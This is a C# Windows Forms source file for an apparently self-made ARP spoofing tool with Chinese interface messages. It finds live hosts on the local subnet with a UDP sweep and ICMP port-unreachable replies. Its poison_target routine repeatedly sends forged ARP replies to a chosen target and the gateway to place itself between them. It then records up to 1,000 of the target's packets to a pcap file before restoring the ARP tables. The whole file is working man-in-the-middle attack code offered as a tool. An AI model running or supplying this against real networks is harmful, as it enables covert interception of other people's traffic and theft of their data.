using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Threading;
using NetworkSubnet;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;

namespace ARPTool
{
    public partial class Form1 : Form
    {
        private LibPcapLiveDevice pcaplive_device;
        private ICaptureDevice capture_device;
        private IPAddress host_ip;
        private IPAddress host_mask;
        private bool packet_enough = false;
        private int packet_count = 1000;
        private CaptureFileWriterDevice pfile;
        private IPAddress targetIP;
        private IPAddress gatewayIP;
        private PhysicalAddress targetMac;
        private PhysicalAddress gatewayMac;
        public Form1()
        {
            InitializeComponent();
            displayDevices();
            this.StartSniffer_Btn.Enabled = false;
            this.Start_Btn.Enabled = false;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show(e.ToString());
        }
        private bool displayDevices()
        {
            var pcaplive_devices = LibPcapLiveDeviceList.Instance;
            try
            {
                foreach (var device in pcaplive_devices)
                {
                    this.Device_checkboxlist.Items.Add(device.Interface.FriendlyName);
                }
                return true;
            }    
            catch (Exception e)
            {
                MessageBox.Show(e.ToString());
            }
            return false;
        }

        private void Device_checkboxlist_SelectedIndexChanged(object sender, EventArgs e)
        {
            for (int i = 0; i < this.Device_checkboxlist.Items.Count; i++)
            {
                if (i != this.Device_checkboxlist.SelectedIndex)
                {
                    this.Device_checkboxlist.SetItemCheckState(i, CheckState.Unchecked);
                }
            }
            pcaplive_device = LibPcapLiveDeviceList.Instance[this.Device_checkboxlist.SelectedIndex];
            capture_device = CaptureDeviceList.Instance[this.Device_checkboxlist.SelectedIndex];
            var AllDevice=NetworkInterface.GetAllNetworkInterfaces();
            var ip_list = AllDevice[this.Device_checkboxlist.SelectedIndex].GetIPProperties().UnicastAddresses;
            var gateway_list=AllDevice[this.Device_checkboxlist.SelectedIndex].GetIPProperties().GatewayAddresses;
            try
            {
                foreach (var ip in ip_list)
                {
                    if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                    {
                        this.IpAddress_textBox.Text = ip.Address.ToString();
                        this.Mask_textBox.Text = ip.IPv4Mask.ToString();
                        host_ip = ip.Address;
                        host_mask = ip.IPv4Mask;
                        break;
                    }
                }
                foreach(var ip in gateway_list)
                {
                    if(ip.Address.AddressFamily==AddressFamily.InterNetwork)
                    {
                        this.gatewayIP_textBox.Text = ip.Address.ToString();
                        gatewayIP = ip.Address;
                        break;
                    }
                }
                this.StartSniffer_Btn.Enabled = true;
                if(gatewayIP!=null)
                {
                    byte[] mac_byte = get_mac(gatewayIP);
                    gatewayMac = new PhysicalAddress(mac_byte);
                    string macaddr = "";
                    foreach(var i in mac_byte)
                    {
                        macaddr =macaddr+'-'+Convert.ToString(i,16);
                    }
                    macaddr = macaddr.TrimStart('-');
                    this.gatewayMac_textBox.Text = macaddr;
                }
            }
            catch (Exception error)
            {
                MessageBox.Show(error.ToString());
            }
        }
        private void StartSniffer_Btn_Click(object sender, EventArgs e)
        {
            if(this.IpAddress_textBox.Text==""||this.Mask_textBox.Text=="")
            {
                MessageBox.Show("请先选择要使用的设别或输入IP地址和子网掩码");
                return;
            }
            else if(host_ip==null||host_mask==null)
            {
                bool ba=IPAddress.TryParse(this.IpAddress_textBox.Text, out host_ip);
                bool bb=IPAddress.TryParse(this.Mask_textBox.Text, out host_mask);
                if(ba==false||bb==false)
                {   
                    MessageBox.Show("请检查输入的IP地址和子网掩码是否有误");
                    return;   
                }
            }
            Subnet net = new Subnet(host_ip, host_mask);
            capture_device.OnPacketArrival +=
                new PacketArrivalEventHandler(sniffer_device_OnPacketArrival);
            capture_device.OnCaptureStopped +=
                new CaptureStoppedEventHandler(sniffer_device_OnCaptureStopped);

            // 开启设备
            capture_device.Open();
            capture_device.StopCaptureTimeout = System.TimeSpan.FromSeconds(2.0);
            this.Output_Textbox.AppendText(String.Format("[*] 开始在 {0} 上捕获ICMP数据包", pcaplive_device.Interface.FriendlyName));
            Thread t = new Thread(delegate() { udp_sender(net, "aaa"); });
            t.Start();
            capture_device.StartCapture();
            //capture_device.Capture();
            //Console.ReadLine();
            // Close the pcap device
            // (Note: this line will never be called since
            //  we're capturing infinite number of packets
        }
        private void StopSniffer_Btn_Click(object sender, EventArgs e)
        {
            //capture_device.StopCaptureTimeout = System.TimeSpan.FromSeconds(2.0);
            try 
            {
                this.Output_Textbox.AppendText("\r\n[*] 正在停止捕获......");
                capture_device.StopCapture();
            }
            catch(PcapException err)
            {
                ;
            }
            finally 
            {
                capture_device.StopCapture();
                capture_device.OnPacketArrival -= sniffer_device_OnPacketArrival;
                capture_device.OnCaptureStopped -= sniffer_device_OnCaptureStopped;
                capture_device.Close();
            }
            
        }
        private void udp_sender(Subnet subnet,string message)
        {
            int time = Environment.TickCount;
            while (Environment.TickCount - time < 2000)
            {
                ;
            }
            if (this.Output_Textbox.InvokeRequired)
            {
               Action<string> actionDelegate = delegate(string txt) { this.Output_Textbox.AppendText(txt); };
               this.Output_Textbox.Invoke(actionDelegate,"\r\n[*] 正在发送UDP数据包");
            }
            else
            {
                this.Output_Textbox.AppendText("\r\n[*] 正在发送UDP数据包");
            }
            UdpClient udpsender;
            byte[] message_bytes = new byte[message.Length];
            for (int i = 0; i < message.Length; i++)
            {
                message_bytes[i] = Convert.ToByte(message[i]);
            }
            foreach (IPAddress ip in subnet.subnet)
            {
                udpsender = new UdpClient(ip.ToString(), 55555);
                udpsender.Send(message_bytes, message_bytes.Length);
            }
            if (this.Output_Textbox.InvokeRequired)
            {
                Action<string> actionDelegate = delegate(string txt) { this.Output_Textbox.AppendText(txt); };
                this.Output_Textbox.Invoke(actionDelegate, "\r\n[*] UDP数据包发送完毕");
            }
            else
            {
                this.Output_Textbox.AppendText("\r\n[*] UDP数据包发送完毕");
            }
        }
        private void sniffer_device_OnCaptureStopped(object sender, CaptureStoppedEventStatus status)
        {
            if (this.Output_Textbox.InvokeRequired)
            {
                Action<string> actionDelegate = delegate(string txt) { this.Output_Textbox.AppendText(txt); };
                this.Output_Textbox.Invoke(actionDelegate, "\r\n[*] 已停止捕获ICMP数据包");
            }
            else
            {
                this.Output_Textbox.AppendText("\r\n[*] 已停止捕获ICMP数据包");
            }
        }
        private void sniffer_device_OnPacketArrival(object sender, CaptureEventArgs e)
        {
            var packet = PacketDotNet.Packet.ParsePacket(e.Packet.LinkLayerType, e.Packet.Data);
            if (packet is PacketDotNet.EthernetPacket)
            {
                var eth = ((PacketDotNet.EthernetPacket)packet);
                if (eth.Type == EthernetPacketType.IpV4)
                {
                    var ip = PacketDotNet.IpPacket.GetEncapsulated(packet);
                    if (ip != null)
                    {
                        if (ip.Protocol == IPProtocolType.ICMP)
                        {

                            var icmp = ICMPv4Packet.GetEncapsulated(packet);
                            if (icmp != null)
                            {
                                if (icmp.TypeCode == ICMPv4TypeCodes.Unreachable_Port)
                                {
                                    if (this.Host_ListBox.InvokeRequired && !this.Host_ListBox.Items.Contains(ip.SourceAddress.ToString()))
                                    {
                                        Action<string> actionDelegate = delegate(string txt) { this.Host_ListBox.Items.Add(txt); };
                                        this.Output_Textbox.Invoke(actionDelegate, "\r\n" + ip.SourceAddress);
                                    }
                                    else
                                    {
                                        this.Host_ListBox.Items.Add("\r\n" + ip.SourceAddress);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        private byte[] get_mac(IPAddress ip)
        {
            ARP arper = new ARP(pcaplive_device);
            PhysicalAddress mac_addr = null; ;
            //while (true)
            //{
              //  mac_addr = arper.Resolve(ip);
            //    if(ip.Address==gatewayIP.Address)
            //    {
            //        break;
            //    }
            //    if (mac_addr != null && mac_addr.ToString() != "58696C4C472B")
            //        break;
            //}
            //Console.WriteLine("ok");
            //Console.Read();
            while(mac_addr==null)
            {
                mac_addr = arper.Resolve(ip);
            }
            return arper.Resolve(ip).GetAddressBytes();  
            //return mac_addr.GetAddressBytes();
        }
        private void Host_ListBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            targetIP = IPAddress.Parse(this.Host_ListBox.SelectedItem.ToString().Trim());
            this.targetIP_textBox.Text = targetIP.ToString();
            byte[] mac_byte = get_mac(targetIP);
            targetMac= new PhysicalAddress(mac_byte);
            string macaddr = "";
            foreach (var i in mac_byte)
            {
                macaddr = macaddr + '-' + Convert.ToString(i, 16);
            }
            macaddr = macaddr.TrimStart('-');
            this.targetMac_textBox.Text = macaddr;
            this.Start_Btn.Enabled = true;
        }

        private void Start_Btn_Click(object sender, EventArgs e)
        {
            string filename = String.Format("{0}.pcap", targetIP.ToString());
            pfile = new CaptureFileWriterDevice(@filename);
            capture_device.Open();
            Thread t = new Thread(delegate() { poison_target(); });
            t.Start();
            capture_device.Filter = String.Format("ip host {0}", targetIP.ToString());
            if(this.Fliter_textBox.Text!="")
                capture_device.Filter =  this.Fliter_textBox.Text+" and "+capture_device.Filter;
            capture_device.OnPacketArrival +=
                new PacketArrivalEventHandler( poison_device_OnPacketArrival);
            capture_device.OnCaptureStopped +=
                new CaptureStoppedEventHandler(poison_device_OnCaptureStopped);
            capture_device.StartCapture();
        }
        private void poison_device_OnPacketArrival(object sender, CaptureEventArgs e)
        {
            pfile.Write(e.Packet);
            packet_count--;
            if (this.progressBar.InvokeRequired&&packet_count%10==0)
            {
                Action<string> actionDelegate = delegate(string i) { this.progressBar.PerformStep(); };
                this.Output_Textbox.Invoke(actionDelegate,"1");
            }
            else
            {
                //this.progressBar.PerformStep();
            }
            //this.progressBar.PerformStep();
            if (packet_count == 0)
            {
                packet_enough = true;
                //progressBar.Step = -100;
                //this.progressBar.PerformStep();
                //progressBar.Step = 1;
            }
        }
        private void poison_device_OnCaptureStopped(object sender, CaptureStoppedEventStatus status)
        {
            pfile.Close();
            packet_count = 1000;
            packet_enough = false;
            capture_device.OnPacketArrival -= poison_device_OnPacketArrival;
            capture_device.OnCaptureStopped -= poison_device_OnCaptureStopped;
            if (this.Output_Textbox.InvokeRequired)
            {
                Action<string> actionDelegate = delegate(string txt) { this.Output_Textbox.AppendText(txt); };
                this.Output_Textbox.Invoke(actionDelegate, "\r\n[*] 已停止捕获投毒目标数据包");
            }
            else
            {
                this.Output_Textbox.AppendText("\r\n[*] 已停止捕获投毒目标数据包");
            }
            
        }
        private  void restore_target()
        {
            PhysicalAddress broadcast_mac = new PhysicalAddress(new byte[6] { 255, 255, 255, 255, 255, 255 });
            ARPPacket arppacket = new ARPPacket(ARPOperation.Response, broadcast_mac,
                targetIP, gatewayMac, gatewayIP);
            EthernetPacket eth = EthernetPacket.RandomPacket();
            eth.PayloadPacket = arppacket;
            eth.Type = EthernetPacketType.Arp;
            eth.SourceHwAddress = gatewayMac;
            eth.DestinationHwAddress = broadcast_mac;
            Packet sendtotarget_packet = Packet.ParsePacket(LinkLayers.Ethernet, eth.Bytes);
            arppacket = new ARPPacket(ARPOperation.Response, broadcast_mac, gatewayIP,
                targetMac, targetIP);
            eth.PayloadPacket = arppacket;
            eth.SourceHwAddress = targetMac;
            Packet sendtogateway_packet = Packet.ParsePacket(LinkLayers.Ethernet, eth.Bytes);
            capture_device.Open();
            if (this.Output_Textbox.InvokeRequired)
            {
                Action<string> actionDelegate = delegate(string txt) { this.Output_Textbox.AppendText(txt); };
                this.Output_Textbox.Invoke(actionDelegate, "\r\n[*] ARP数据包构造完成，开始还原......");
            }
            else
            {
                this.Output_Textbox.AppendText("\r\n[*] ARP数据包构造完成，开始还原......");
            }
            for (int i = 0; i < 5; i++)
            {
                capture_device.SendPacket(sendtotarget_packet);
                capture_device.SendPacket(sendtogateway_packet);
            }
            capture_device.Close();
            if (this.Output_Textbox.InvokeRequired)
            {
                Action<string> actionDelegate = delegate(string txt) { this.Output_Textbox.AppendText(txt); };
                this.Output_Textbox.Invoke(actionDelegate, "\r\n[*] ARP数据包发送完毕，还原ARP完成");
            }
            else
            {
                this.Output_Textbox.AppendText("\r\n[*] ARP数据包发送完毕，还原ARP完成");
            }
        }
        private void poison_target()
        {
            capture_device.Open();
            PhysicalAddress device_mac = capture_device.MacAddress;
            ARPPacket arppacket = new ARPPacket(ARPOperation.Response, targetMac,
                targetIP, device_mac, gatewayIP);
            EthernetPacket eth = EthernetPacket.RandomPacket();
            eth.PayloadPacket = arppacket;
            eth.Type = EthernetPacketType.Arp;
            eth.SourceHwAddress = device_mac;
            eth.DestinationHwAddress = targetMac;
            Packet sendtotarget_packet = Packet.ParsePacket(LinkLayers.Ethernet, eth.Bytes);
            //MessageBox.Show(eth.SourceHwAddress.ToString()+eth.DestinationHwAddress.ToString());
            //MessageBox.Show(arppacket.TargetHardwareAddress.ToString()+arppacket.TargetProtocolAddress.ToString());
            //MessageBox.Show(arppacket.SenderHardwareAddress.ToString() + arppacket.SenderProtocolAddress.ToString());
            arppacket = new ARPPacket(ARPOperation.Response, gatewayMac, gatewayIP,
                device_mac, targetIP);
            eth.PayloadPacket = arppacket;
            eth.SourceHwAddress = device_mac;
            eth.DestinationHwAddress = gatewayMac;
            Packet sendtogateway_packet = Packet.ParsePacket(LinkLayers.Ethernet, eth.Bytes);
            if (this.Output_Textbox.InvokeRequired)
            {
                Action<string> actionDelegate = delegate(string txt) { this.Output_Textbox.AppendText(txt); };
                this.Output_Textbox.Invoke(actionDelegate, "\r\n[*] 开始ARP投毒......");
            }
            else
            {
                this.Output_Textbox.AppendText("\r\n[*] 开始ARP投毒......");
            }
            while (!packet_enough)
            {
                capture_device.SendPacket(sendtotarget_packet);
                capture_device.SendPacket(sendtogateway_packet);
                delay(2000);
            }
            stop_poison();
            if (this.Output_Textbox.InvokeRequired)
            {
                Action<string> actionDelegate = delegate(string txt) { this.Output_Textbox.AppendText(txt); };
                this.Output_Textbox.Invoke(actionDelegate, "\r\n[*] ARP投毒结束");
            }
            else
            {
                this.Output_Textbox.AppendText("\r\n[*] ARP投毒结束");
            }
            restore_target();
            //capture_device.Close();
        }
        private static void delay(int ms)
        {
            int time = Environment.TickCount;
            while (Environment.TickCount - time < ms)
            {
                ;
            }
        }

        private void Stop_Btn_Click(object sender, EventArgs e)
        {
            this.progressBar.Step = -100;
            this.progressBar.PerformStep();
            this.progressBar.Step = 1;
            this.Output_Textbox.AppendText("\r\n[*] 正在停止捕获......");
            stop_poison();
        }
        private void stop_poison()
        {
            //capture_device.StopCaptureTimeout = System.TimeSpan.FromSeconds(2.0);
            try
            {
                packet_enough = true;
                capture_device.StopCapture();
            }
            catch (PcapException err)
            {
                ;
            }
            finally
            {
                capture_device.StopCapture();
            }
        }
    }
}
